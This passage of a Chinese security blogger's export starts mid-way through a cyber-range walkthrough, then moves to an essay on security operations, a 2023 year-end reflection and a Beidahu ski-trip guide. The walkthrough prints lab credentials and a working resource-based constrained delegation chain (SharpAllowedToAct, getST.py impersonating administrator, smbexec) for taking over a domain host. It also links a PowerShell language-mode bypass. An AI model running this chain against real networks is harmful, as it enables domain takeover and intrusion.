<p><img src="/2023/12/06/dragon_wp/image-20220612182423302.png" alt="image-20220612182423302"></p>
<p>发现该机器有tv，同时连接着 192.168.201.100这台机器</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612182449360.png" alt="image-20220612182449360"></p>
<p>而且桌面保存着密码</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612183954238.png" alt="image-20220612183954238"></p>
<p>连接成功</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612184021543.png" alt="image-20220612184021543"></p>
<h4 id="ws09-clm限制"><a href="#ws09-clm限制" class="headerlink" title="ws09- clm限制"></a>ws09- clm限制</h4><p>发现cmd被禁用</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612184847067.png" alt="image-20220612184847067"></p>
<p>发现很多命令被禁用</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612184921608.png" alt="image-20220612184921608"></p>
<p>同时powershell被设置为 clm 语言模式</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612185723118.png" alt="image-20220612185723118"></p>
<p>同时发现该目录无法执行exe</p>
<p>切换一个白目录</p>
<p>bypass clm</p>
<p><a href="https://hackmd.io/@0xbc000/B1pNFIuP">https://hackmd.io/@0xbc000/B1pNFIuP</a>_</p>
<p>限制目录执行exe</p>
<p>发现rbcd的用户</p>
<p><img src="/2023/12/06/dragon_wp/image-20220613131615068.png" alt="image-20220613131615068"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220613132059427.png" alt="image-20220613132059427"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">husungeng:X9NNkYTMp9jA2vKHXXI</span><br></pre></td></tr></table></figure>



<h4 id="ws12-rbcd接管exchange"><a href="#ws12-rbcd接管exchange" class="headerlink" title="ws12-rbcd接管exchange"></a>ws12-rbcd接管exchange</h4><p>生成机器账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m husungeng -p X9NNkYTMp9jA2vKHXXI -t ws12 -a 192.168.200.2 haishi.lab</span><br></pre></td></tr></table></figure>



<p>获取服务票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.200.2 haishi/husungeng:X9NNkYTMp9jA2vKHXXI -spn cifs/ws12.haishi.lab -impersonate administrator </span><br></pre></td></tr></table></figure>

<p>导入票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache </span><br></pre></td></tr></table></figure>

<p>getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k ws12.haishi.lab</span><br></pre></td></tr></table></figure>



<p><img src="/2023/12/06/dragon_wp/image-20220613170723911.png" alt="image-20220613170723911"></p>
<h4 id="ws13-dc"><a href="#ws13-dc" class="headerlink" title="ws13-dc"></a>ws13-dc</h4>]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈安全运营</title>
    <url>/2023/12/24/%E6%B5%85%E8%B0%88%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/</url>
    <content><![CDATA[<p>很喜欢职业欠钱师傅的一句话，企业大多数是为产出付费，即你解决了哪些问题，而不是知识付费。</p>
<p>最开始听到工作内容是安全运营的时候，还以为是发一发公众号这类的纯运营工作。在实际接触之后发现与自己想的大不相同。</p>
<p>这个岗位和蓝队有一点像，但又有很多区别。</p>
<ol>
<li>首先是目标不同。蓝队的任务一般是保证在攻防演练期间系统不被红队攻破，而安全运营的任务目标是保证业务在正常运行的时候不被入侵。二者从时间维度上来讲就相差甚大，安全运营面临的挑战更大</li>
<li>其次是面临的对手不同。蓝队的对手只有红队，安全运营需要面对所有对系统安全构成威胁的主体，包括但不限于红队，APT组织，黑产，蠕虫（最多），以及内部的员工安全意识淡薄造成的风险，错误配置，内鬼等</li>
<li>最后是岗位要求。相比于蓝队，安全运营除了基本的技术要求外，还需要沟通表达能力去推进一个事件的完成。</li>
</ol>
<p>安全运营需要的基本能力要求：</p>
<ol>
<li>溯源取证</li>
<li>应急响应</li>
<li>数据分析</li>
<li>逆向分析</li>
<li>应用安全</li>
<li>威胁情报</li>
<li>团队协作</li>
<li>写作绘图</li>
</ol>
<p>除了基本的技术能力外，安全运营工作还经常需要去跨部门沟通，基本的沟通能力与表达能力必不可少。此外，在完成一次攻击链路溯源后，一般都需要开会复盘，这时候还需要将攻击链路图画出来，并且输出一篇溯源文档，包括攻击手法，攻击链路，IOC，黑客画像等，由此可以看出，写作绘图能力必不可少。<br>在做安全运营的工作之前，我一直以为搞技术的写文档干什么，不都是瞎吹么… 实际接触之后发现并没有我想的那么简单，这也是一门技术活，文档和图标可以帮助别人更加容易的get到自己想表达的点，省去了很多沟通成本。</p>
<p>安全运营需要养成的习惯：</p>
<ol>
<li><p>记录数据。数据是自己产出的一种表现形式，也是给老板汇报工作的一种手段，而且是很直观的一种手段。同时，衡量自己一段时间的工作变化，选择一个合适的指标用数据的形式展现出来，在绩效总结的时候，也能更清楚的阐释清楚自己的工作价值。</p>
</li>
<li><p>职责划分。不要把所有活都往自己身上揽。哪些工作是业务的，哪些工作是SDL的，哪些工作是运营团队。需要提前划定责任，每个人为自己的结果负责。免的出事再扯皮，各个团队互相推锅，同时也能避免做一些没必要的工作。</p>
</li>
</ol>
<p>暂时想到这里，后续再补充吧</p>
]]></content>
      <categories>
        <category>安全运营</category>
      </categories>
      <tags>
        <tag>安全运营</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>享受孤独——2023</title>
    <url>/2023/12/29/%E4%BA%AB%E5%8F%97%E5%AD%A4%E7%8B%AC%E2%80%94%E2%80%942023/</url>
    <content><![CDATA[<p>怎么就突然到年底了呢？怎么就到写年终总结的时候了呢？回看了今年博客输出的内容，越来越少。想写点什么，却又无从下笔。翻开相册找点灵感，发现全是玩玩玩。更觉得这是碌碌无为的一年。但仍然要感谢自己，2023辛苦了。</p>
<hr>
<h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>作为一个技术er不可避免的简单谈谈今年学到了哪些技术。<br>今年技术的学习也可以分为两个阶段：攻击方和防守方。</p>
<p>#攻击方<br>今年作为攻击方打了几场小hw，我在其中的角色主要还是后渗透，在实战中学到了很多攻击面，对攻击的理解我个人觉得比去年提高了很多。其次就是免杀这块，没事就研究研究。不过免杀的手法日新月异，转为防守方后对这块的研究逐渐丢弃，慢慢已经跟不上了……</p>
<p>#防守方<br>来到防守方后，作为反入侵团队的一员，几乎全身心投入到防守方的能力建设，工作内容和 攻击也不再沾边。应急响应这个岗位很有意思，需要对入侵事件兜底，还是有点压力的。在告警出现的时候需要推进安全事件的止血与修复，推进事件完成的过程不可避免的一个个call 对应的owner，记对应的action，自然免不了与业务方的扯皮。毫无疑问这是一门艺术。沟通对一个技术er来说并不是一件简单的事情，可能对大部分初入职场的技术人来说都是。这也是我今年成长比较多的一项技能：与人沟通。在不断处理安全事件的过程中，自己的沟通能力也在不断的提高。</p>
<p>有点扯远了。</p>
<p>今年作为大模型爆发的元年，自然离不开对大模型攻防的研究。作为一个应急er，想的是怎么样将大模型应用落地应急响应，落地场景有哪些？这些场景有什么困难？怎么样去解决这些困难？解决这些问题的过程也是提高自己对大模型理解的过程。<br>在今年投入了不少精力在大模型的研究上，在明年毕业后应该也会持续进行这一块的研究。<br>欢迎感兴趣的师傅一起交流～</p>
<hr>
<h1 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h1><p>作为一个明年毕业的学生，找到一个满意的工作是今年的首要Object。<br>随着疫情的结束，之前在学校远程办公的好日子也到头了。虽然在2年前就已经开始实习了，不过大部分的时间都在学校里远程办公。远程办公的快乐只有体会过的人才懂～（呜呜呜好怀念） 在前两年因为自己没有转正的压力，所以在远程办公的时候难免会 “偶尔” 滑水。但今年自己需要拿到一个正式的offer，没有办法再像以前那样划水摸鱼，自然是想做出一番成绩。这时回到公司上班就成了一个必须的选择，于是在三月初又回到了上海。</p>
<p>在回到上海后，在当时问了ld一嘴有没有转正的hc，当时的答复是不确定，当时23届的2个实习生也是因为没有转正hc，不得不离职。因为已经有了先例，这让我也意识到不能all in转正，需要提早准备。</p>
<p>最开始的春招并不顺利，投了阿里（当时还没有拆分），3月份面挂，4月份被捞起来二次挂，2次糟糕的面试经历不禁让我对自己的能力有了怀疑。当时安慰自己说，甲方去不了可以看看乙方，可能是部门不匹配啊……不过好在蚂蚁那边的面试很顺利，在5月份自己即将回学校的前一天拿到了offer，这个时间真的很巧。在离开公司的前一天晚上，和蒋大佬在公司的天台聊了很久（这是我第一次去腾云的天台（当时没有意识到这也是最后一次），就在健身房的旁边，以前竟然没发现）。蒋大佬跟我讲了很多，也让我对如何选择一份工作有一定的了解。虽然希望我留下，但是因为公司政策的原因，是否有转正的hc也没办法给我一个确切的答复。<br>就这样怀着纠结的心情回到了学校</p>
<p>回到学校后的三天里每天都在纠结（第一次拿到offer后在犹豫去不去，没有经验，所以只跟hr要了3天的考虑时间，现在想想当时有更好的解法）。当时微信群里的师傅们，脉脉，还有朋友们也都给了我建议，各有利弊，但最终的决定还是由我来做。很遗憾，在经历了激烈的思想斗争后，还是拒绝了蚂蚁（当时决定的很草率）。仅仅过了3天我就后悔了，去问hr还有没有希望来蚂蚁，在得到否定的答复后心情很复杂。</p>
<p>不过，在失去了蚂蚁的机会后，阿里云再次捞起了我，很感谢现在的主管和老板一直在帮我推进度走特批，终于也在6月拿到了意向书。这次我也没有犹豫，接受了offer。向腾讯提交了离职申请书。去阿里云的原因也很简单，不用打hw，而且可以去杭州。</p>
<p>这也是我职业生涯的一个转折点，从一名一线的攻击队转向防守方。在面试的时候也数次被问到，选择阿里云的原因是什么，会不会排斥做防守方…… </p>
<p>在加入阿里云之前，实习的两年时间里都是做攻击队，这让我对攻防演练产生了一些思考：打攻防2年后的我会是什么样子，自己的攻击能力应该可以提高很多，厉害点的话可能可以指哪打哪。但这并不会让我对整个安全行业的理解更深。种种原因，我选择加入了阿里云。同时也顺利转正，今年Obj.No1 完成。<br>值得一题的是，几个关系还不错的小伙伴也拿到了阿里/蚂蚁的offer，几年没见的网友终于可以在杭州面基😄。</p>
<p>今年找工作真的很不容易，对于普通二本学校的学生来说更是如此。我是幸运的。很庆幸自己在大二就开始在腾讯实习，在加入阿里云之前已经有了接近2年的实习经验，这也让我的特批流程走的比较顺利。转正答辩的时候老板和hr也没有为难我，秋招很顺利。我并没有觉得自己比别人强很多，今年找工作比较顺利运气真的占了很大一部分。</p>
<hr>
<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>另自己没想到的是，去年临时起意开始的健身，也断断续续坚持了一整年。尽管中间因为伤到了腰，休息了一段时间，还好坚持了下来。</p>
<p>#生活无解，徒步撒野<br>在来到北京后，喜欢上了一项新的运动：徒步。不过说来惭愧，来北京接近半年的时间里，徒步频率每月一次都没有。但这并不影响我对徒步本身的热爱。我很享受一个人在山里向上走的感觉，克服重力做功，然后登顶，一览众山小。周中的时间每天坐在办公室里，对一个向往大自然的孩子是很枯燥的！只有周末投身山里，自己的这种压力才会得到排解。</p>
<p>北京对我来说唯一的吸引力大概就是城市周围的山很多，每周一座的话大概也能爬两年不重样。不喜欢北京的原因很大一部分是北京给我的感觉是缺乏了年轻人的朝气，这倒与这座历史悠久的京城背景相映衬。与北京相反，上海就展示出了它作为一个经济中心极强的包容性与城市活力。今年万圣节上海的年轻人自发性组织在一起，通过cos各种装扮以另一种方式表达自己内心的情绪吧，上海真的很了不起。但对于一个喜欢徒步的人来说，上海没有一座可以爬的山……这也是当初离开上海的原因之一。</p>
<p>#旅游<br>我想每一个热爱徒步的人心中都有一个环游世界的梦。<br>旅游于我，是一剂治愈生活的良药。工作本就很苦，在旅游的途中可以短暂忘记工作中的烦恼。同时，在心里种下一个目的地的种子，生活也会更加有奔头。</p>
<p>今年也去了不少地方，城市园林，沙漠戈壁，历史古城，一望无际的草原……相比于城市内的建筑风光，我更偏爱大自然。新鲜的空气，一眼望不到头的天边，我站在辽阔的大地上，一边感叹自己的渺小，另一边探索世界的欲望再被点燃。我想，这便是赚钱的意义吧，为了看更广阔的世界，也为了成为更好的自己。</p>
<p>今年的一个遗憾是没有在北京追到极光。没有人会想到在北京也能看到极光，直到12.1号的晚上，极光大爆发，在北京的密云、怀柔等地有天文摄影师拍到了极光。当时自己的心一下被点燃，在12.2号的下午在xhs找了几个搭子，晚上就蹭车出发追极光！ 去的路上心情是激动的，但理智也告诉自己今晚看到的可能性不太大，不要报太大希望。<br>确实没看到极光，不过看到了满天繁星，已经很久也没有看到过这样的星空了。<br>很有意思的是，大家虽然互不相识，但可以坐在一起围炉煮茶，聊天聊地，不亦乐乎。很难得的一次体验。<br><img src="/2023/12/29/%E4%BA%AB%E5%8F%97%E5%AD%A4%E7%8B%AC%E2%80%94%E2%80%942023/20231223201904.png"><br>在今年年底再次测了一下自己的MBTI，不出所料，还是一个不折不扣的i人，但是e的属性比之前增加了很多。自己也可以感觉的到，我比以前开朗了，也更加有自信了。<br>我想，这是今年徒步和旅游对我自己的改变吧。</p>
<p>#滑雪<br>断断续续的滑雪，今年也算入了个门，差不多可以换刃了。<br>定个flag：2024学会走刃，然后可以去室外的滑雪场滑～<br>可可托海～ 将军山～ 禾木～ 北海道～<br>冲冲冲</p>
<p>#演唱会<br>今年最开心的事情莫过于去看了两场演唱会。Jay &amp;&amp; JJ。<br>人生中第一次看演唱会，自己抢到了票，自己一个人进场，自己一个人看。唯一的遗憾大概就是看演唱会的时候没有人陪在身边，不过慢慢也习惯了这种感觉。</p>
<p>第一次看演唱会，避免不了的热泪盈眶。从小听到大的歌曲在现场和大家一起合唱，而在一直存在于耳机里的那个人也终于出现在了眼前，夹杂着些许不真实。我想这种感觉只有亲自站在喜欢了很多年的歌手的演唱会台下的时候才能懂。</p>
<p><img src="/2023/12/29/%E4%BA%AB%E5%8F%97%E5%AD%A4%E7%8B%AC%E2%80%94%E2%80%942023/20231223201835.png"><br><img src="/2023/12/29/%E4%BA%AB%E5%8F%97%E5%AD%A4%E7%8B%AC%E2%80%94%E2%80%942023/20231223201610.png"></p>
<p>一个词总结今年的生活的话，我想孤独最合适。绝大多数时间都是自己一个人度过。从最开始的不习惯，到现在慢慢开始享受这种孤独。这也是成长中必须经历的一环吧，不管多么亲近的人，可心里始终有一份他人无法理解的孤独，无法与他人分享。世界上没有真正的感同身受。</p>
<hr>
<h1 id="New-beginning"><a href="#New-beginning" class="headerlink" title="New beginning"></a>New beginning</h1><p>希望2024可以顺利毕业。<br>祝自己越来越棒，过好自己的生活，这就够了。</p>
]]></content>
      <categories>
        <category>个人总结</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
      </tags>
  </entry>
  <entry>
    <title>大学生北大湖滑雪攻略</title>
    <url>/2024/01/31/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%8C%97%E5%A4%A7%E6%B9%96%E6%BB%91%E9%9B%AA%E6%94%BB%E7%95%A5/</url>
    <content><![CDATA[<p>年后打算趁着大学生的身份，薅一下北大湖的羊毛，写了这篇攻略，仅供参考。</p>
<h1 id="费用"><a href="#费用" class="headerlink" title="费用"></a>费用</h1><p>交通费<br> <del>租赁装备（雪板+雪鞋+头盔+雪镜）  100r/天  + 保险 20r/天+ 住宿 150r/天</del><br>住滑套餐 1230/人+ 吃饭  50-100r 左右/天 + 柜子 30r/个 +  ~~2k 押金 ~~<br>=2k 左右 （不算交通费）</p>
<p>大学生 住滑套餐 7 天<br>169<em>5 + 189</em>2 = 1230<br><img src="/2024/01/31/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%8C%97%E5%A4%A7%E6%B9%96%E6%BB%91%E9%9B%AA%E6%94%BB%E7%95%A5/image-20240131123040067.png" alt="image-20240131123040067"></p>
<h2 id="教练：-750-r-2h"><a href="#教练：-750-r-2h" class="headerlink" title="教练： 750 r/2h"></a>教练： 750 r/2h</h2><p>看个人意愿，请教练 2h 学 后刃+前刃，学的比较快。</p>
<h1 id="装备"><a href="#装备" class="headerlink" title="装备"></a>装备</h1><p><img src="/2024/01/31/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%8C%97%E5%A4%A7%E6%B9%96%E6%BB%91%E9%9B%AA%E6%94%BB%E7%95%A5/image-20240131123052543.png" alt="image-20240131123052543"><br>雪服雪裤：雪场可以租。自己带冲锋衣冲锋裤也可，冲锋衣可能进水。咸鱼买一套也不贵，200 左右。</p>
<p>手套：自备。pdd 买，买带防丢绳 + 放雪卡的。30 左右。单板买闷子。里面最好套一个内胆手套，迪卡侬 19.9 那款。</p>
<p>护臀，护膝：最好准备下，可咸鱼买。黑犀，南恩，goski 等。别买小乌龟，使用寿命短。</p>
<p>护脸：几十块的就行</p>
<p>速干衣，速干裤：迪卡侬的就行</p>
<p>滑雪袜：1688  十几块一双，买几双</p>
<h1 id="交通"><a href="#交通" class="headerlink" title="交通"></a>交通</h1><p>飞机：长春龙嘉国际机场-北大湖<br>高铁：到达吉林站。</p>
<h2 id="包车"><a href="#包车" class="headerlink" title="包车"></a>包车</h2><p>长春机场： 300-350r。提前联系。拼车的话人均 100</p>
<h2 id="雪场大巴"><a href="#雪场大巴" class="headerlink" title="雪场大巴"></a>雪场大巴</h2><p>80r/人<img src="/2024/01/31/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%8C%97%E5%A4%A7%E6%B9%96%E6%BB%91%E9%9B%AA%E6%94%BB%E7%95%A5/image-20240131123110835.png" alt="image-20240131123110835"></p>
<h1 id="雪道"><a href="#雪道" class="headerlink" title="雪道"></a>雪道</h1><p><img src="/2024/01/31/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%8C%97%E5%A4%A7%E6%B9%96%E6%BB%91%E9%9B%AA%E6%94%BB%E7%95%A5/image-20240131123127666.png" alt="image-20240131123127666"><br><img src="/2024/01/31/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%8C%97%E5%A4%A7%E6%B9%96%E6%BB%91%E9%9B%AA%E6%94%BB%E7%95%A5/image-20240131123133364.png" alt="image-20240131123133364"><br>推荐进阶顺序:<br>暮雪道H16 - 星光大道 - 阳光大道 - D3 - 闪电道D13+逍遥大道D15 - 南楼大道H18 - 青云大道D14 - D16～D21 - 追风大道H10 - 岗梁道H6 - 挑战者之路 - D11/D12 - D9 -e5</p>
<h2 id="暮雪道H16-（11-度）"><a href="#暮雪道H16-（11-度）" class="headerlink" title="暮雪道H16  （11 度）"></a>暮雪道H16  （11 度）</h2><p>C索到站右拐进入暮雪道，上段有两三个11°左右的坡，下段很平缓，人也不多，是突破魔毯和UU索之后新手进阶的不错选择。</p>
<h2 id="星光大道-（15-度）"><a href="#星光大道-（15-度）" class="headerlink" title="星光大道 （15 度）"></a>星光大道 （15 度）</h2><p>E索主干道，2km的入门雪道，吊箱也很舒适。第一段坡较陡（15°左右），之后就都很平缓了。</p>
<h2 id="阳光大道-（17-度）"><a href="#阳光大道-（17-度）" class="headerlink" title="阳光大道 （17 度）"></a>阳光大道 （17 度）</h2><p>超人气雪道，宽长直的练活道，山顶就可以看到雪道全貌。坡顶有17°左右，然后逐渐变缓。</p>
<h2 id="D3-D4-18-度"><a href="#D3-D4-18-度" class="headerlink" title="D3 + D4 (18 度)"></a>D3 + D4 (18 度)</h2><p>星光上段左边有个大坡，这里进去就是D3，坡度只略高于阳光，而且人少道宽。下段可以接D4或星光，都不是很难（D4有一段公园）</p>
<h2 id="闪电道D13（18-度）-逍遥大道D15（14-度）"><a href="#闪电道D13（18-度）-逍遥大道D15（14-度）" class="headerlink" title="闪电道D13（18 度）+逍遥大道D15（14 度）"></a>闪电道D13（18 度）+逍遥大道D15（14 度）</h2><p>G索山顶（大顶子山）向下盘旋的初级道，滑行长度可达4km。闪电道有些拐弯处有18°左右的坡度，但都不长。如果是新手雪友第一次滑这条道，一定要好好看地图和路标，不然很容易误入中高级道。</p>
<h2 id="南楼大道H18（22-度-北大湖绿道天花板）"><a href="#南楼大道H18（22-度-北大湖绿道天花板）" class="headerlink" title="南楼大道H18（22 度  北大湖绿道天花板）"></a>南楼大道H18（22 度  北大湖绿道天花板）</h2><p>风景绝美的雪道，从山底要坐三趟缆车才能到达，连上阳光滑行长度可达5km。这条道的标旗是绿色的，新手雪友一定不要因此轻视它，这条道中间有好几个20°以上的以上的陡坡，甚至有地方达到了23°，我去的时候每个陡坡入口都有很多人停在那里。</p>
<h2 id="青云大道D14-（26-度）"><a href="#青云大道D14-（26-度）" class="headerlink" title="青云大道D14 （26 度）"></a>青云大道D14 （26 度）</h2><p>北大湖的明星中级道，有几个小陡坡，其中一个达到了26°，第一次滑的时候建议避开挑战者之路，如果对陡坡没自信有几个地方可以遁入初级道。</p>
<h2 id="D16-D21"><a href="#D16-D21" class="headerlink" title="D16~D21"></a>D16~D21</h2><p>JKH索区域的雪道，人少道宽，吊箱也很舒适。很适合练活。总体难度和青云相差不大，放在青云之后的主要原因是因为没法遁入初级道… 征服青云之后，这一片就没什么问题了，很建议在这边练活。</p>
<h2 id="追风大道H10-（25-度）"><a href="#追风大道H10-（25-度）" class="headerlink" title="追风大道H10 （25 度）"></a>追风大道H10 （25 度）</h2><p>南楼山顶向下的中级道，坡度和青云相仿但陡坡更多更长。</p>
<h2 id="岗梁道H6-（28-度）"><a href="#岗梁道H6-（28-度）" class="headerlink" title="岗梁道H6 （28 度）"></a>岗梁道H6 （28 度）</h2><p>D索上站向下的中级道，风景很美，驻扎了很多摄影师。比追风要更陡一点，有地方达到了28°左右（但很短），另外还有两条岗梁H5 H7，难度都是要大于H6的</p>
<h2 id="挑战者之路-（29-度）"><a href="#挑战者之路-（29-度）" class="headerlink" title="挑战者之路  （29 度）"></a>挑战者之路  （29 度）</h2><p>挑战者之路位于青云中段，坡度有30°左右但并不长。在去真正的黑道（D9, D11, D12) 之前，建议先尝试一下挑战者之道，如果滑下来很顺利再去其他黑道。如果挑战者之道滑得吃力的话，其余黑道长长的陡坡会更加难受。</p>
<h2 id="D9（33-度）-D11-D12（30-度）"><a href="#D9（33-度）-D11-D12（30-度）" class="headerlink" title="D9（33 度）/D11/D12（30 度）"></a>D9（33 度）/D11/D12（30 度）</h2><p>这几条是北大湖的常规黑道了，难度相差不大，都有30°以上的陡坡且连绵不绝，没有太多休息的空间。</p>
<h2 id="E5-野雪道"><a href="#E5-野雪道" class="headerlink" title="E5 野雪道"></a>E5 野雪道</h2><p>坐 D 索上，最好找经常滑野雪的人带，不然不好出</p>
<h1 id="吃饭"><a href="#吃饭" class="headerlink" title="吃饭"></a>吃饭</h1><h2 id="度假区内"><a href="#度假区内" class="headerlink" title="度假区内"></a>度假区内</h2><h3 id="【COMMUNE】"><a href="#【COMMUNE】" class="headerlink" title="【COMMUNE】"></a>【COMMUNE】</h3><p>地点：北大湖度假区服务中心3楼<br>怎会不为commune而心动💓，原木小屋的装修风格，与窗外的雪景相得益彰，仿佛置身在国外📸，除了出片率极高外这里的东西也超级好吃(๑´ڡ`๑)<br>🍽推荐菜：脆脆金沙翅、德式香肠拼盘、迷迭香烤春鸡、意式火腿披萨等（基本每一款都不踩雷，还能喝点小酒🍸）</p>
<h3 id="【北大湖服务中心2楼】"><a href="#【北大湖服务中心2楼】" class="headerlink" title="【北大湖服务中心2楼】"></a>【北大湖服务中心2楼】</h3><p>这里是一个比较综合的美食广场，中午的话就建议在这里解决啦🍱<br>🍽好吃推荐：</p>
<h3 id="🌟-Arabica咖啡店"><a href="#🌟-Arabica咖啡店" class="headerlink" title="🌟%Arabica咖啡店"></a>🌟%Arabica咖啡店</h3><p>雪地里的咖啡小车，豆子很香，首推西班牙拿铁和冰美式☕️</p>
<h3 id="🌟老街称盘麻辣烫"><a href="#🌟老街称盘麻辣烫" class="headerlink" title="🌟老街称盘麻辣烫"></a>🌟老街称盘麻辣烫</h3><p>湿拌型麻辣烫，和传统的汤不一样，但是它们家的辣椒粉和蒜泥都有独特的香味🍲</p>
<h3 id="🌟尹老爷陕西面馆"><a href="#🌟尹老爷陕西面馆" class="headerlink" title="🌟尹老爷陕西面馆"></a>🌟尹老爷陕西面馆</h3><p>陕西风味的面馆，肉夹馍和biangbiang面都不错🍜</p>
<h3 id="🌟百年石锅"><a href="#🌟百年石锅" class="headerlink" title="🌟百年石锅"></a>🌟百年石锅</h3><p>韩式料理，烤牛肉石锅拌饭，黑胡椒牛肉饭都很好吃，有机菜花也很推荐🍚</p>
<h3 id="🌟米芝莲"><a href="#🌟米芝莲" class="headerlink" title="🌟米芝莲"></a>🌟米芝莲</h3><p>港式风味店，鸡蛋仔和丝袜奶茶是最好的搭配🍹<br>另外这里还有KFC、太平洋等其他连锁店，旺季时中午人都会比较多，根据想吃的口味尽早排队吧🔥吃完就直接餐厅出门滑雪也是非常方便了⏰️</p>
<hr>
<h2 id="度假区外："><a href="#度假区外：" class="headerlink" title="度假区外："></a>度假区外：</h2><p>在山下，需要开车，车程5-10分钟</p>
<h3 id="📍【华鑫乌拉火锅】"><a href="#📍【华鑫乌拉火锅】" class="headerlink" title="📍【华鑫乌拉火锅】"></a>📍【华鑫乌拉火锅】</h3><p>北方特色风味火锅，喜欢吃羊肉的uu必冲，其他菜品也很不错🍗</p>
<h3 id="📍【聚义饭店】"><a href="#📍【聚义饭店】" class="headerlink" title="📍【聚义饭店】"></a>📍【聚义饭店】</h3><p>东北风味餐馆，适合想体验东北美食文化的uu，自家人的餐馆，很实惠🍛</p>
<h3 id="📍【雪缘张家大院】"><a href="#📍【雪缘张家大院】" class="headerlink" title="📍【雪缘张家大院】"></a>📍【雪缘张家大院】</h3><p>这家应该也是不少雪友的“食堂”了，能想到的东北菜都有，作为来东北必吃的铁锅炖大鹅、铁锅炖鱼都很棒❗️</p>
<h1 id="其他行程"><a href="#其他行程" class="headerlink" title="其他行程"></a>其他行程</h1><h2 id="温泉"><a href="#温泉" class="headerlink" title="温泉"></a>温泉</h2><h3 id="圣德泉亲水度假花园"><a href="#圣德泉亲水度假花园" class="headerlink" title="圣德泉亲水度假花园"></a>圣德泉亲水度假花园</h3><p>免票</p>
<h3 id="神农蕴泉旅游度假区"><a href="#神农蕴泉旅游度假区" class="headerlink" title="神农蕴泉旅游度假区"></a>神农蕴泉旅游度假区</h3><p>免票</p>
<h3 id="卓远温泉休闲旅游度假区"><a href="#卓远温泉休闲旅游度假区" class="headerlink" title="卓远温泉休闲旅游度假区"></a>卓远温泉休闲旅游度假区</h3><p>免票</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="桦甸市森林慢谷康养度假区"><a href="#桦甸市森林慢谷康养度假区" class="headerlink" title="桦甸市森林慢谷康养度假区"></a>桦甸市森林慢谷康养度假区</h3><p>免票</p>
<h3 id="枫雪部落"><a href="#枫雪部落" class="headerlink" title="枫雪部落"></a>枫雪部落</h3><p>免票</p>
<h3 id="乌拉冰雪奇幻乐园"><a href="#乌拉冰雪奇幻乐园" class="headerlink" title="乌拉冰雪奇幻乐园"></a>乌拉冰雪奇幻乐园</h3><p>门票免费，园区内项目 5 折</p>
<h3 id="梦幻冰雪大世界"><a href="#梦幻冰雪大世界" class="headerlink" title="梦幻冰雪大世界"></a>梦幻冰雪大世界</h3><p>周一免费</p>
]]></content>
      <categories>
        <category>旅游攻略</category>
      </categories>
      <tags>
        <tag>旅游</tag>
        <tag>滑雪</tag>
      </tags>
  </entry>
</search>
